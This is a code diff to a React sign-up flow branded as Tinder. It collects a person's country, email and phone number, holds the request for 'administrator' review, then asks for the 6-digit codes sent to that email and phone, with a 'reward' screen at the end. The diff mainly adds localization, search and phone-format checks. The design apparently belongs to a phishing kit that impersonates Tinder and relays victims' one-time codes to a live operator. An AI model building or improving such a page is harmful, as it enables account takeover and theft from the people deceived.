@@ -2,14 +2,79 @@ import { useEffect, useMemo, useRef, useState } from "react";
 import { authClient, rememberSessionToken } from "@/lib/auth/client";
 import { type AppUser } from "@/lib/auth/use-current-user";
 import { TinderMark } from "@/components/tinder-mark";
-import { COUNTRIES, dialCode, withDialCode } from "@/data/countries";
+import { COUNTRIES, dialCode, withDialCode, isExactPhone, localPhoneDigits, phonePlaceholder } from "@/data/countries";
 import { saveApplication, continueApplication, confirmCode, endVisitorSession, getAccess, WRONG_PHONE_NOTICE, NEW_EMAIL_NOTICE, DECLINE_DETAILS_NOTICE, RESTART_COUNTRY_NOTICE, RESTART_DETAILS_NOTICE, type Access } from "@/lib/applications";
+import { countryLabel, localizeMessage, useLocale } from "@/lib/locale";
+
+function fold(value: string) {
+  return value
+    .normalize("NFD")
+    .replace(/\p{M}/gu, "")
+    .toLowerCase();
+}
 
 const COUNTRY_INDEX = COUNTRIES.map((name) => ({
   name,
   lower: name.toLowerCase(),
+  folded: fold(name),
   dial: dialCode(name),
 }));
+
+const REVIEW_LOCK = "tinder-details-review";
+
+type ReviewLock = { at: number; email: string; phone: string; country: string };
+
+function readReviewLock(): ReviewLock | null {
+  if (typeof sessionStorage === "undefined") return null;
+  try {
+    const raw = sessionStorage.getItem(REVIEW_LOCK);
+    if (!raw) return null;
+    const parsed = JSON.parse(raw) as ReviewLock;
+    if (!parsed || !Number.isFinite(parsed.at)) return null;
+    return parsed;
+  } catch {
+    return null;
+  }
+}
+
+function writeReviewLock(lock: ReviewLock) {
+  sessionStorage.setItem(REVIEW_LOCK, JSON.stringify(lock));
+}
+
+function clearReviewLock() {
+  sessionStorage.removeItem(REVIEW_LOCK);
+}
+
+function sameSubmission(
+  existing: { email?: string; phone?: string } | null | undefined,
+  lock: ReviewLock,
+) {
+  const email = String(existing?.email ?? "").trim().toLowerCase() === lock.email.trim().toLowerCase();
+  const phone = String(existing?.phone ?? "").replace(/\D/g, "") === lock.phone.replace(/\D/g, "");
+  return email && phone;
+}
+
+function approvalAfterLock(
+  existing: { status?: string; email?: string; phone?: string; updatedAt?: number; notice?: string | null } | null | undefined,
+  lock: ReviewLock | null,
+) {
+  if (!lock || !existing) return false;
+  if (editingNotice(existing)) return false;
+  if (existing.status !== "approved") return false;
+  if (!sameSubmission(existing, lock)) return false;
+  return (existing.updatedAt ?? 0) > lock.at;
+}
+
+function editingNotice(existing: { status?: string; notice?: string | null } | null | undefined) {
+  return (
+    existing?.status === "rejected" ||
+    existing?.notice === WRONG_PHONE_NOTICE ||
+    existing?.notice === NEW_EMAIL_NOTICE ||
+    existing?.notice === DECLINE_DETAILS_NOTICE ||
+    existing?.notice === RESTART_COUNTRY_NOTICE ||
+    existing?.notice === RESTART_DETAILS_NOTICE
+  );
+}
 
 export function ApplyFlow({
   user,
@@ -29,12 +94,24 @@ export function ApplyFlow({
   const [email, setEmail] = useState("");
   const [phone, setPhone] = useState("");
   const [code, setCode] = useState("");
+  const [codeError, setCodeError] = useState<string | null>(null);
   const [error, setError] = useState<string | null>(null);
   const [busy, setBusy] = useState(false);
+  const [reviewLock, setReviewLock] = useState<ReviewLock | null>(() => readReviewLock());
+  useEffect(() => {
+    if (!reviewLock || !existing) return;
+    const released = approvalAfterLock(existing, reviewLock);
+    const editingNow = (existing.updatedAt ?? 0) > reviewLock.at && editingNotice(existing);
+    if (!released && !editingNow) return;
+    clearReviewLock();
+    setReviewLock(null);
+  }, [reviewLock, existing]);
   const seededPhone = useRef("");
   const phoneRef = useRef<HTMLInputElement>(null);
   const emailRef = useRef<HTMLInputElement>(null);
   const countryRef = useRef<HTMLInputElement>(null);
+  const pressY = useRef(0);
+  const { locale, t } = useLocale();
   const wrongPhone = existing?.notice === WRONG_PHONE_NOTICE;
   const newEmail = existing?.notice === NEW_EMAIL_NOTICE;
   const phoneUnchanged =
@@ -76,19 +153,21 @@ export function ApplyFlow({
     else if (newEmail || existing?.notice === DECLINE_DETAILS_NOTICE || existing?.notice === RESTART_DETAILS_NOTICE) emailRef.current?.focus();
   }, [step, wrongPhone, newEmail, existing?.notice]);
 
-  const needle = query.trim().toLowerCase();
+  const needle = fold(query.trim());
   const matches = useMemo(() => {
     if (!needle) return COUNTRIES;
     const dialNeedle = needle.replace(/^\+/, "");
     const starts: string[] = [];
     const rest: string[] = [];
     for (const item of COUNTRY_INDEX) {
-      if (item.lower.startsWith(needle) || item.dial.startsWith(dialNeedle)) starts.push(item.name);
-      else if (item.lower.includes(needle) || item.dial.includes(dialNeedle)) rest.push(item.name);
-      if (starts.length === 8) break;
+      const local = fold(countryLabel(item.name, locale));
+      const nameHit = item.folded.startsWith(needle) || local.startsWith(needle);
+      const dialHit = dialNeedle.length > 0 && item.dial.startsWith(dialNeedle);
+      if (nameHit || dialHit) starts.push(item.name);
+      else if (item.folded.includes(needle) || local.includes(needle) || (dialNeedle.length > 1 && item.dial.includes(dialNeedle))) rest.push(item.name);
     }
-    return [...starts, ...rest].slice(0, 8);
-  }, [needle]);
+    return [...starts, ...rest].slice(0, 12);
+  }, [needle, locale]);
 
   const phoneReady = typeof existing?.phone === "string" && existing.phone.replace(/\D/g, "").length >= 8;
 
@@ -132,28 +211,23 @@ export function ApplyFlow({
       <section className="flex h-full flex-col px-5">
         <BrandMark onLogout={logOut} />
         <div className="ember-rise flex flex-1 flex-col justify-center">
-          <p className="text-sm font-medium text-ember">Blocked</p>
-          <h1 className="mt-2 font-serif text-4xl tracking-tight">Access has been blocked</h1>
-          <p className="mt-3 text-stone">An administrator blocked this request. You cannot continue.</p>
+          <p className="text-sm font-medium text-ember">{t("blocked")}</p>
+          <h1 className="mt-2 font-serif text-4xl tracking-tight">{t("blockedTitle")}</h1>
+          <p className="mt-3 text-stone">{t("blockedBody")}</p>
         </div>
       </section>
     );
   }
 
-  if (existing && !existing.emailVerified && existing.emailCodePending) {
-    return (
-      <CodeStep
-        kicker="Email code"
-        progress={60}
-        title="Code under review"
-        body="Under review"
-        waiting
-       
-      />
-    );
-  }
+  const editing = editingNotice(existing);
+  const detailsReady = Boolean(existing?.email) && phoneReady;
+  const approvedAfterSubmit = approvalAfterLock(existing, reviewLock);
+  const showReview = (!!reviewLock && !approvedAfterSubmit && !editing) || Boolean(existing && existing.status !== "approved" && !editing);
 
-  if (existing && existing.status === "pending" && !existing.emailVerified && !existing.emailCodePending) {
+  if (showReview) {
+    const shownCountry = reviewLock?.country || existing?.country || country;
+    const shownEmail = reviewLock?.email || existing?.email || email;
+    const shownPhone = String(reviewLock?.phone || existing?.phone || phone || "");
     return (
       <section className="flex h-full flex-col">
         <div className="px-5">
@@ -161,54 +235,65 @@ export function ApplyFlow({
         </div>
         <Progress value={40} />
         <div className="flex min-h-0 flex-1 flex-col px-5">
-          <h1 className="mt-2 font-serif text-3xl tracking-tight">Contact details</h1>
-          <p className="mt-2 text-sm text-stone">{existing.country}</p>
+          <h1 className="mt-2 font-serif text-3xl tracking-tight">{t("contactDetails")}</h1>
+          <p className="mt-2 text-sm text-stone">{shownCountry ? countryLabel(shownCountry, locale) : ""}</p>
           <label className="mt-4 block text-sm font-medium text-stone" htmlFor="wait-email">
-            Email
+            {t("email")}
           </label>
-          <input id="wait-email" readOnly value={existing.email ?? ""} className="field mt-1 px-4" />
+          <input id="wait-email" readOnly value={shownEmail} className="field mt-1 px-4" />
           <label className="mt-3 block text-sm font-medium text-stone" htmlFor="wait-phone">
-            Phone number
+            {t("phone")}
           </label>
-          <input id="wait-phone" readOnly value={phoneReady ? `+${existing.phone.replace(/\D/g, "")}` : ""} className="field mt-1 px-4" />
-          <p className="mt-4 text-sm font-medium text-cream">Under review</p>
-          <div className="mt-6 flex justify-center" role="status" aria-live="polite">
-            <span className="spin size-8 rounded-full border-2 border-white/25 border-t-white" />
-            <span className="sr-only">Loading</span>
-          </div>
+          <input id="wait-phone" readOnly value={shownPhone.startsWith("+") ? shownPhone : `+${shownPhone.replace(/\D/g, "")}`} className="field mt-1 px-4" />
+          <p className="mt-4 text-sm font-medium text-cream">{t("underReview")}</p>
+          <Loader />
         </div>
       </section>
     );
   }
 
-  if (existing && existing.status === "approved" && !existing.emailVerified && !existing.emailCodePending) {
+  const codeOpen = existing?.status === "approved" && (!reviewLock || approvedAfterSubmit);
+
+  if (existing && codeOpen && !existing.emailVerified && existing.emailCodePending) {
     return (
       <CodeStep
-        kicker="Email code"
+        kicker={t("emailCode")}
         progress={60}
-        title="Enter your email code"
-        body={
-          existing.notice ??
-          `Enter the code you received for ${existing.email}.`
-        }
-        code={code}
-        error={error}
-        busy={busy}
-        onChange={setCode}
-        onSubmit={() => void submitCode("email")}
-        onReview={access && (access.isReviewer || access.needsReviewer) ? onReview : undefined}
-       
+        title={t("underReview")}
+        body={t("underReview")}
+        waiting
       />
     );
   }
 
-  if (existing?.status === "approved" && existing.phoneCodePending && !existing.phoneVerified) {
+  if (existing && codeOpen && !existing.emailVerified && !existing.emailCodePending && detailsReady) {
     return (
       <CodeStep
-        kicker="Phone code"
+        kicker={t("emailCode")}
+        progress={60}
+        title={t("enterEmailCode")}
+        body={
+          existing.notice === "Enter the email code again." || existing.notice === "That code was not accepted. Enter the code again."
+            ? localizeMessage(existing.notice, locale)
+            : t("enterCodeFor", { target: existing.email || "" })
+        }
+        code={code}
+        error={codeError}
+        busy={busy}
+        onChange={setCode}
+        onSubmit={() => void submitCode("email")}
+        onReview={access && (access.isReviewer || access.needsReviewer) ? onReview : undefined}
+      />
+    );
+  }
+
+  if (existing?.status === "approved" && existing.emailVerified && existing.phoneCodePending && !existing.phoneVerified) {
+    return (
+      <CodeStep
+        kicker={t("phoneCode")}
         progress={80}
-        title="Code under review"
-        body="Under review"
+        title={t("underReview")}
+        body={t("underReview")}
         waiting
        
       />
@@ -218,12 +303,16 @@ export function ApplyFlow({
   if (existing && existing.status === "approved" && existing.emailVerified && !existing.phoneVerified && !existing.phoneCodePending && phoneReady) {
     return (
       <CodeStep
-        kicker="Phone code"
+        kicker={t("phoneCode")}
         progress={80}
-        title="Confirm your phone"
-        body={existing.notice ?? `Your email is verified. Enter the code you received for +${existing.phone.replace(/\D/g, "")}.`}
+        title={t("confirmPhone")}
+        body={
+          existing.notice === "Enter the phone code again." || existing.notice === "That code was not accepted. Enter the code again."
+            ? localizeMessage(existing.notice, locale)
+            : t("phoneCodeBody", { phone: existing.phone.replace(/\D/g, "") })
+        }
         code={code}
-        error={error}
+        error={codeError}
         busy={busy}
         onChange={setCode}
         onSubmit={() => void submitCode("phone")}
@@ -240,14 +329,14 @@ export function ApplyFlow({
         <BrandMark />
         <Progress value={90} />
         <div className="ember-rise flex flex-1 flex-col justify-center">
-          <p className="text-sm font-medium text-ember">{declined ? "Not approved" : "Reward"}</p>
+          <p className="text-sm font-medium text-ember">{declined ? t("notApproved") : t("reward")}</p>
           <h1 className="mt-2 font-serif text-4xl tracking-tight">
-            {declined ? "The reward was not approved" : "Reward under review"}
+            {declined ? t("rewardNotApproved") : t("rewardUnderReview")}
           </h1>
           <p className="mt-3 text-stone">
             {declined
-              ? "An administrator did not approve the reward."
-              : "Under review."}
+              ? t("rewardDeclinedBody")
+              : t("underReview")}
           </p>
           {declined ? null : <Loader />}
         </div>
@@ -255,38 +344,36 @@ export function ApplyFlow({
     );
   }
 
-  const editing =
-    existing?.status === "rejected" ||
-    existing?.notice === WRONG_PHONE_NOTICE ||
-    existing?.notice === NEW_EMAIL_NOTICE ||
-    existing?.notice === DECLINE_DETAILS_NOTICE ||
-    existing?.notice === RESTART_COUNTRY_NOTICE ||
-    existing?.notice === RESTART_DETAILS_NOTICE;
-
-  if (existing && !editing) {
+  if (existing && !editing && existing.status === "pending") {
     return (
       <section className="flex h-full flex-col px-5">
         <BrandMark />
         <Progress value={40} />
         <div className="ember-rise flex flex-1 flex-col justify-center">
-          <p className="text-sm font-medium text-ember">Under review</p>
-          <h1 className="mt-2 font-serif text-4xl tracking-tight">Under review</h1>
+          <p className="text-sm font-medium text-ember">{t("underReview")}</p>
+          <h1 className="mt-2 font-serif text-4xl tracking-tight">{t("underReview")}</h1>
           <Loader />
         </div>
       </section>
     );
   }
 
-  const suggested = needle ? matches.find((name) => name.toLowerCase().startsWith(needle)) : undefined;
+  const suggested = needle
+    ? matches.find((name) => {
+        const local = fold(countryLabel(name, locale));
+        return fold(name).startsWith(needle) || local.startsWith(needle);
+      })
+    : undefined;
+  const suggestedLabel = suggested ? countryLabel(suggested, locale) : "";
   const ghost =
-    suggested && query.length > 0 && suggested.toLowerCase().startsWith(query.toLowerCase())
-      ? suggested.slice(query.length)
+    suggestedLabel && query.length > 0 && fold(suggestedLabel).startsWith(fold(query))
+      ? suggestedLabel.slice(query.length)
       : "";
 
   function chooseCountry(name: string) {
     setPhone((current) => withDialCode(current, name, country));
     setCountry(name);
-    setQuery(name);
+    setQuery(countryLabel(name, locale));
   }
 
   async function logOut() {
@@ -296,6 +383,7 @@ export function ApplyFlow({
       /* the local clear below still ends this browser session */
     }
     rememberSessionToken(null);
+    clearReviewLock();
     window.location.replace("/");
   }
 
@@ -305,9 +393,10 @@ export function ApplyFlow({
     try {
       const next = await confirmCode({ data: { channel, code } });
       setCode("");
+      setCodeError(null);
       onAccess(next);
     } catch (err) {
-      setError(err instanceof Error ? err.message : "Could not check that code");
+      setCodeError(err instanceof Error ? localizeMessage(err.message, locale) : t("codeCheckFailed"));
     } finally {
       setBusy(false);
     }
@@ -315,27 +404,31 @@ export function ApplyFlow({
 
   async function submit() {
     if (!country) {
-      setError("Choose a country first.");
+      setError(t("chooseCountryFirst"));
       return;
     }
     if (!email.includes("@")) {
-      setError("Enter your email.");
+      setError(t("enterEmail"));
       return;
     }
-    if (phone.replace(/\D/g, "").length < 8) {
-      setError("Enter your phone number.");
+    if (!isExactPhone(phone, country)) {
+      setError(t("phoneInvalid", { country: countryLabel(country, locale) }));
       return;
     }
     if (phoneUnchanged) {
-      setError("Enter the correct phone number.");
+      setError(t("correctPhone"));
       return;
     }
     if (emailUnchanged) {
-      setError("Enter another email.");
+      setError(t("anotherEmail"));
       return;
     }
     setError(null);
     setBusy(true);
+    const baseline = Math.max(existing?.updatedAt ?? 0, 0);
+    const hold = { at: baseline, email, phone, country };
+    writeReviewLock(hold);
+    setReviewLock(hold);
     try {
       const send = () =>
         user
@@ -348,7 +441,12 @@ export function ApplyFlow({
       let last: unknown;
       for (let attempt = 0; attempt < 3; attempt += 1) {
         try {
-          onAccess(await send());
+          const saved = await send();
+          const serverAt = saved.application?.updatedAt ?? 0;
+          const lock = { at: Math.max(baseline, serverAt), email, phone, country };
+          writeReviewLock(lock);
+          setReviewLock(lock);
+          onAccess(saved);
           return;
         } catch (err) {
           last = err;
@@ -357,8 +455,10 @@ export function ApplyFlow({
           await new Promise((resolve) => window.setTimeout(resolve, 400));
         }
       }
-      const message = last instanceof Error ? last.message : "Could not submit";
-      setError(message === "Failed to fetch" ? "Could not submit. Tap Continue again." : message || "Could not submit. Tap Continue again.");
+      const message = last instanceof Error ? last.message : "";
+      clearReviewLock();
+      setReviewLock(null);
+      setError(message ? localizeMessage(message, locale, country) : t("submitRetry"));
     } finally {
       setBusy(false);
     }
@@ -374,7 +474,7 @@ export function ApplyFlow({
         <>
           <div className="px-5">
             <h1 className="mt-2 font-sans text-4xl font-extrabold tracking-tight">TINDER</h1>
-            <p className="mt-6 font-serif text-3xl tracking-tight">Choose your country</p>
+            <p className="mt-6 font-serif text-3xl tracking-tight">{t("chooseCountry")}</p>
             <div className="field relative mt-5">
               {ghost ? (
                 <div className="pointer-events-none absolute inset-0 flex items-center px-4" aria-hidden="true">
@@ -390,7 +490,10 @@ export function ApplyFlow({
                   setQuery(next);
                   const typed = next.trim().toLowerCase();
                   if (!typed) return;
-                  const pick = COUNTRY_INDEX.find((item) => item.lower.startsWith(typed));
+                  const pick = COUNTRY_INDEX.find((item) => {
+                    const local = fold(countryLabel(item.name, locale));
+                    return item.folded.startsWith(typed) || local.startsWith(typed);
+                  });
                   if (pick && pick.name !== country) {
                     setPhone((current) => withDialCode(current, pick.name, country));
                     setCountry(pick.name);
@@ -402,8 +505,8 @@ export function ApplyFlow({
                     chooseCountry(suggested);
                   }
                 }}
-                placeholder="Search countries"
-                aria-label="Search countries"
+                placeholder={t("searchCountries")}
+                aria-label={t("searchCountries")}
                 aria-autocomplete="list"
                 autoComplete="off"
                 className="relative h-full w-full bg-transparent px-4 text-cream outline-none placeholder:text-stone"
@@ -418,6 +521,15 @@ export function ApplyFlow({
                   <button
                     type="button"
                     aria-pressed={selected}
+                    onMouseDown={(event) => event.preventDefault()}
+                    onPointerDown={(event) => {
+                      pressY.current = event.clientY;
+                    }}
+                    onPointerUp={(event) => {
+                      if (event.pointerType !== "touch") return;
+                      if (Math.abs(event.clientY - pressY.current) > 10) return;
+                      chooseCountry(name);
+                    }}
                     onClick={() => chooseCountry(name)}
                     className={
                       selected
@@ -425,16 +537,16 @@ export function ApplyFlow({
                         : "flex h-12 w-full items-center rounded-xl px-3 text-left text-cream"
                     }
                   >
-                    {name}
+                    {countryLabel(name, locale)}
                     {needle && name === suggested ? (
-                      <span className="ml-2 text-xs font-medium text-ember">Suggested</span>
+                      <span className="ml-2 text-xs font-medium text-ember">{t("suggested")}</span>
                     ) : null}
                     <span className="ml-auto text-sm text-stone">+{dialCode(name)}</span>
                   </button>
                 </li>
               );
             })}
-            {needle && matches.length === 0 ? <li className="py-6 text-stone">No country matches that.</li> : null}
+            {needle && matches.length === 0 ? <li className="py-6 text-stone">{t("noCountry")}</li> : null}
           </ul>
           {error && step === "country" ? <p className="px-5 pt-2 text-sm text-ember">{error}</p> : null}
           <div className="safe-b px-5 pt-3">
@@ -442,7 +554,7 @@ export function ApplyFlow({
               type="button"
               onClick={() => {
                 if (!country) {
-                  setError("Choose a country first.");
+                  setError(t("chooseCountryFirst"));
                   return;
                 }
                 setError(null);
@@ -450,7 +562,7 @@ export function ApplyFlow({
               }}
               className="brand-btn tap"
             >
-              Continue
+              {t("continue")}
             </button>
           </div>
         </>
@@ -463,29 +575,29 @@ export function ApplyFlow({
             void submit();
           }}
         >
-          <h1 className="mt-2 font-serif text-3xl tracking-tight">Contact details</h1>
+          <h1 className="mt-2 font-serif text-3xl tracking-tight">{t("contactDetails")}</h1>
           <button
             type="button"
             onClick={() => setStep("country")}
             className="mt-2 self-start text-sm font-medium text-stone"
           >
-            {country || "Change country"}
+            {country ? countryLabel(country, locale) : t("changeCountry")}
           </button>
           {wrongPhone ? (
-            <p className="mt-4 text-sm font-medium text-[#ff3b30]">Enter the correct phone number.</p>
+            <p className="mt-4 text-sm font-medium text-[#ff3b30]">{t("correctPhone")}</p>
           ) : newEmail ? (
-            <p className="mt-4 text-sm font-medium text-[#ff3b30]">Enter another email.</p>
-          ) : existing?.notice === DECLINE_DETAILS_NOTICE || existing?.notice === RESTART_DETAILS_NOTICE ? (
-            <p className="mt-4 text-sm font-medium text-cream">{existing.notice}</p>
+            <p className="mt-4 text-sm font-medium text-[#ff3b30]">{t("anotherEmail")}</p>
+          ) : existing?.notice === DECLINE_DETAILS_NOTICE || existing?.notice === RESTART_DETAILS_NOTICE || existing?.notice === RESTART_COUNTRY_NOTICE ? (
+            <p className="mt-4 text-sm font-medium text-cream">{localizeMessage(existing.notice, locale)}</p>
           ) : existing?.notice ? (
-            <p className="mt-4 rounded-2xl bg-chip px-4 py-3 text-sm text-cream">{existing.notice}</p>
+            <p className="mt-4 rounded-2xl bg-chip px-4 py-3 text-sm text-cream">{localizeMessage(existing.notice, locale)}</p>
           ) : existing?.status === "rejected" ? (
             <p className="mt-4 rounded-2xl bg-chip px-4 py-3 text-sm text-cream">
-              The previous request was declined. Update your details and submit them again.
+              {t("declinedRetry")}
             </p>
           ) : null}
           <label className={`mt-4 block text-sm font-medium ${newEmail ? "text-[#ff3b30]" : "text-stone"}`} htmlFor="email">
-            Email
+            {t("email")}
           </label>
           <input
             id="email"
@@ -500,7 +612,7 @@ export function ApplyFlow({
             className={`field mt-1 px-4 ${emailUnchanged ? "phone-alert" : ""}`}
           />
           <label className={`mt-3 block text-sm font-medium ${wrongPhone ? "text-[#ff3b30]" : "text-stone"}`} htmlFor="phone">
-            Phone number
+            {t("phone")}
           </label>
           <div
             className={`field mt-1 flex items-center ${phoneUnchanged ? "phone-alert" : ""}`}
@@ -516,18 +628,18 @@ export function ApplyFlow({
               aria-invalid={phoneUnchanged || undefined}
               value={phone.replace(/\D/g, "").replace(new RegExp(`^${dialCode(country)}`), "")}
               onChange={(event) => {
-                const local = event.target.value.replace(/\D/g, "");
+                const local = localPhoneDigits(event.target.value, country);
                 setPhone(withDialCode(local, country));
               }}
-              placeholder="700000000"
+              placeholder={phonePlaceholder(country)}
               className="h-full w-full min-w-0 flex-1 bg-transparent pr-4 pl-0 text-cream outline-none placeholder:text-stone"
             />
           </div>
           {emailUnchanged ? (
-            <p className="mt-2 text-sm text-[#ff3b30]">This email was not accepted. Enter another email before you can continue.</p>
+            <p className="mt-2 text-sm text-[#ff3b30]">{t("emailRejected")}</p>
           ) : null}
           {phoneUnchanged ? (
-            <p className="mt-2 text-sm text-[#ff3b30]">This number was rejected. Change it before you can continue.</p>
+            <p className="mt-2 text-sm text-[#ff3b30]">{t("phoneRejected")}</p>
           ) : null}
           {error ? <p className="mt-3 text-sm text-ember">{error}</p> : null}
           <div className="safe-b pt-4">
@@ -537,7 +649,7 @@ export function ApplyFlow({
               onClick={() => void submit()}
               className="brand-btn tap"
             >
-              {busy ? <Spinner /> : "Continue"}
+              {busy ? <Spinner /> : t("continue")}
             </button>
           </div>
         </form>
@@ -573,6 +685,7 @@ function CodeStep({
   onReview?: () => void;
   onLogout?: () => void;
 }) {
+  const { t } = useLocale();
   return (
     <form
       className="flex h-full flex-col px-5"
@@ -590,7 +703,7 @@ function CodeStep({
         {waiting ? <Loader /> : (
           <>
             <label className="mt-6 block text-sm font-medium text-stone" htmlFor="verify-code">
-              6-digit code
+              {t("sixDigit")}
             </label>
             <input
               id="verify-code"
@@ -613,11 +726,11 @@ function CodeStep({
           disabled={busy || code.length !== 6}
           className="brand-btn tap"
         >
-          {busy ? <Spinner /> : "Confirm code"}
+          {busy ? <Spinner /> : t("confirmCode")}
         </button>
         {onReview ? (
           <button type="button" onClick={onReview} className="tap mt-3 h-12 w-full rounded-2xl border border-line font-medium text-cream">
-            Review requests
+            {t("reviewRequests")}
           </button>
         ) : null}
       </div>
@@ -627,16 +740,17 @@ function CodeStep({
 }
 
 function Loader() {
+  const { t } = useLocale();
   return (
     <div className="mt-8 flex justify-center" role="status" aria-live="polite">
-      <TinderMark className="flame-pulse size-14" />
-      <span className="sr-only">Loading</span>
+      <span className="spin size-12 rounded-full border-[3px] border-white/20 border-t-[#ff4d6a]" aria-label={t("loading")} />
     </div>
   );
 }
 
 function Spinner() {
-  return <span className="spin size-5 rounded-full border-2 border-white/35 border-t-white" aria-label="Loading" />;
+  const { t } = useLocale();
+  return <span className="spin size-5 rounded-full border-2 border-white/35 border-t-white" aria-label={t("loading")} />;
 }
 
 function Progress({ value }: { value: number }) {
@@ -660,6 +774,7 @@ function Progress({ value }: { value: number }) {
 
 function BrandMark({ onLogout }: { onLogout?: () => void | Promise<void> }) {
   const [leaving, setLeaving] = useState(false);
+  const { t } = useLocale();
   return (
     <div className="flex h-14 items-center gap-2">
       <TinderMark className="size-7" />
@@ -675,7 +790,7 @@ function BrandMark({ onLogout }: { onLogout?: () => void | Promise<void> }) {
           }}
           className="tap ml-auto grid h-8 min-w-8 place-items-center text-sm font-medium text-stone disabled:opacity-80"
         >
-          {leaving ? <span className="spin size-4 rounded-full border-2 border-stone border-t-transparent" aria-label="Loading" /> : "Log out"}
+          {leaving ? <span className="spin size-4 rounded-full border-2 border-stone border-t-transparent" aria-label={t("loading")} /> : t("logOut")}
         </button>
       ) : null}
     </div>
